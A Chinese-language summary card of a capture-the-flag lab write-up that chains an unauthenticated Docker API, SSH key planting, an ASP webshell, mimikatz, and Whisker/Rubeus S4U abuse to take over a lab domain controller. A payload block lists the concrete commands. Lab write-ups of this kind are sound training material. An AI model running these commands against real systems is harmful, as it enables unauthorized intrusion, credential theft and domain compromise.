---
title: "春秋云镜——Unauthorized WriteUp"
category: web
tags: ["春秋云镜靶场", "web", "Docker未授权", "SSH公钥注入", "MySQL未授权", "FTP匿名"]
signals: ["春秋云镜靶场 2022", "Docker未授权", "SSH公钥注入", "MySQL未授权", "FTP匿名", "ASP webshell", "SweetPotato", "mimikatz", "Kerberos证书认证", "auth_bypass", "Unauthorized", "Docker", "SSH", "ASP"]
difficulty: hard
source: "https://www.ctfiot.com/69927.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 春秋云镜——Unauthorized WriteUp

> 赛事：春秋云镜靶场 2022 | 方向：web | 难度：hard

## 一句话总结

春秋云镜Unauthorized：Docker 2375未授权+SSH公钥注入+ASP+证书委派Rubeus S4U

## 攻击链

1. Docker 2375未授权→启动ubuntu容器-v /:/mnt挂载宿主机→写root/.ssh/authorized_keys→SSH公钥登录→MySQL root/123456弱口令读flag→nmap扫内网→FTP匿名+ASP webshell→SweetPotato提权→mimikatz sekurlsa logonpasswords→Whisker添加DC02$机器证书→Rubeus asktgt + S4U2Self→mimikatz dcsync→wmiexec登录DC02读flag

## 关键 payload

```
docker -H tcp://47.92.205.41:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04;echo ssh-rsa ... > /mnt/root/.ssh/authorized_keys;mysql -uroot -p123456;ftp> put shell.asp;Whisker.exe add /target:DC02$ /dc:DC02.xiaorang.lab;Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:CIFS/DC02.xiaorang.lab /ptt
```

## 经验教训

Docker daemon 2375未授权+AD CS证书+Whisker/Rubeus是经典域内权限提升组合

## 标签

Docker未授权、SSH公钥注入、MySQL未授权、FTP匿名、ASP webshell、SweetPotato、mimikatz、Kerberos证书认证、Rubeus S4U、AD域

## 参考来源

- https://www.ctfiot.com/69927.html
- 原文件：春秋云镜——Unauthorized_WriteUp.full.md
